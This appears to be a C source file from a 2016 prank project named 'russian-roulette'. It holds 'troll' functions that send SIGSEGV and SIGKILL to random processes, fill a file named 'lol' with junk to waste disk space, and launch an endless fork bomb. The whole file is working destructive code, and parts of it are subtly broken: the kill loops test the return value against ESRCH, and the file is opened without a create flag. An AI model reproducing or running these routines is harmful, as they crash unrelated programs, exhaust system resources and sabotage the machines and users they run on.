/*
** trolls.c for trolls in /home/admin/Documents/Programming/russian-roulette/source/trolls
** 
** Made by Thomas Murgia
** Login   <garuda1@protonmail.com>
** 
** Started on  Sat May 21 11:31:23 2016 Thomas Murgia
** Last update Sat May 21 11:31:23 2016 Thomas Murgia
*/

#define   _POSIX_C_SOURCE 2

#include  <signal.h>
#include  <limits.h>
#include  <trolls.h>
#include  <unistd.h>
#include  <fcntl.h>
#include  <randpid.h>
#include  <errno.h>
#include  <my.h>

void      segfault_rand(void)
{
  my_puts("Segfaulting a random PID!");
  while (kill(randpid(), SIGSEGV) == ESRCH);
}

void      sigkill_rand(void)
{
  my_puts("SIGKILLing a random PID!");
  while (kill(randpid(), SIGKILL) == ESRCH);
}

void      waste_disk(void)
{
  char    c;
  int     i;
  int     fd;

  my_puts("Wasting disk space!");
  c = '*';
  fd = open("lol", O_WRONLY);
  i = 0;
  while (i != INT_MAX)
    {
      write(fd, &c, 1);
      ++i;
    }
  close(fd);
}

void      fork_bomb(void)
{
  my_puts("Fork bomb!");
  while (1)
    fork();
}
